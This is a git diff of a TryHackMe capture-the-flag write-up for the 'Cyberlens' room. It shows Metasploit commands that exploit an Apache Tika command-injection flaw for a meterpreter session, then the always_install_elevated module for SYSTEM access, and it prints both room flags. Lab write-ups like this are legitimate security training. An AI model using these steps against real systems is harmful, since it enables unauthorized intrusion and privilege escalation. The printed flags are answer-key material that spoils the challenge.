@@ -54,7 +54,7 @@ Jetty is simply a web server. So I visited `cyberlens.thm:61777` to see what com
 Apache Tika is an open source library used to detect and extract metadata from files. This page is apparently showing us the endpoints that we can use to interact with it. And here's an interesting endpoint: <br />
 ![image](https://github.com/user-attachments/assets/a6891ab3-01c4-4961-8bfe-6fd97d766fe6)<br />
 ![image](https://github.com/user-attachments/assets/7afb34cb-bc52-433f-80e1-b765a422ad8c)<br />
-That endpoint gave me the version of the Tika software that's being used(PS, I just realized that this information was also given by the scan on port 61777, but I'm stupid). After some enumeration, I found out that this Tika version is vulnerable to command injection, and the exploit is available on metasploit. The module name is `windows/http/apache_tika_jp2_jscript)`. 
+That endpoint gave me the version of the Tika software that's being used(PS, I just realized that this information was also given by the scan on port 61777, but I'm stupid). After some enumeration, I found out that this Tika version is vulnerable to command injection, and the exploit is available on metasploit. The module name is `windows/http/apache_tika_jp2_jscript`. 
 Correctly set up the options, in my case: 
 
     set LHOST 10.11.85.53
@@ -63,6 +63,24 @@ Correctly set up the options, in my case:
     run
 And I got a meterpreter session. Inside `C:\Users\Cyberlens\Desktop` we can find user.txt(flags are at the end of this writeup): <br />
 ![image](https://github.com/user-attachments/assets/727249b4-5fee-43f9-9a8f-385aeb1a4f81)<br />
+Can we get the administrator account?<br />
+I decided to use a metasploit module called `multi/recon/local_exploit_suggester`, which tries to find vulnerabilities to escalate privileges within a meterpreter session. 
+
+    multi/recon/local_exploit_suggester
+    set session YOUR_SESSION
+    run
+And this is what it finds: <br />
+![image](https://github.com/user-attachments/assets/24cf5fd1-7ceb-4bb0-853c-a82c2bca736f)<br />
+So I tried to use the first one: 
+
+    use windows/local/always_install_elevated
+    set lhost 10.11.108.100
+    set lport 4445
+    set session 2
+And I'm now the system user, and can locate the admin flag:
+![image](https://github.com/user-attachments/assets/fce9e244-3653-4423-bdaa-15c8f22017aa)<br />
+
+
 
 - What is the user flag?  `THM{T1k4-CV3-f0r-7h3-w1n}`
-- What is the admin flag? 
+- What is the admin flag? `THM{3lev@t3D-4-pr1v35c!}`
